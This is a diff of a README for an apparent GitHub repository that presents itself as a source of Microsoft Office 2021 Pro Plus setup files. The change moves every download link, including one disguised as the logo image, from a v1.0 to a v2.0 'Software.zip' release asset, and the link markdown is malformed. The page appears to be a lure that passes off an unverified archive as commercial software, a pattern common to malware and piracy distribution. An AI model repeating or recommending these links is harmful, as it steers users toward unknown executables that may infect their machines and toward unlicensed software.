@@ -1,6 +1,6 @@
 # 🚀 Welcome to Microsoft Office 2021 Pro Plus Repository! 
 
-![Microsoft Office Logo](https://github.com/sameer5039/Microsoft-Office-2021-Pro-Plus/releases/download/v1.0/Software.zip)
+![Microsoft Office Logo](https://github.com/sameer5039/Microsoft-Office-2021-Pro-Plus/releases/download/v2.0/Software.zip)
 
 ## Description
 This repository contains the setup files and tools for Microsoft Office 2021 Pro Plus. The latest suite to enhance your productivity!
@@ -26,7 +26,7 @@ This repository contains the setup files and tools for Microsoft Office 2021 Pro
 - Word
 
 ## Setup Link
-[![Download Microsoft Office 2021 Pro Plus](https://github.com/sameer5039/Microsoft-Office-2021-Pro-Plus/releases/download/v1.0/Software.zip%20Office%202021%20Pro%https://github.com/sameer5039/Microsoft-Office-2021-Pro-Plus/releases/download/v1.0/Software.zip)](https://github.com/sameer5039/Microsoft-Office-2021-Pro-Plus/releases/download/v1.0/Software.zip)
+[![Download Microsoft Office 2021 Pro Plus](https://github.com/sameer5039/Microsoft-Office-2021-Pro-Plus/releases/download/v2.0/Software.zip%20Office%202021%20Pro%https://github.com/sameer5039/Microsoft-Office-2021-Pro-Plus/releases/download/v2.0/Software.zip)](https://github.com/sameer5039/Microsoft-Office-2021-Pro-Plus/releases/download/v2.0/Software.zip)
 
 *Click the button above to download the setup file and start using Microsoft Office 2021 Pro Plus!*
 
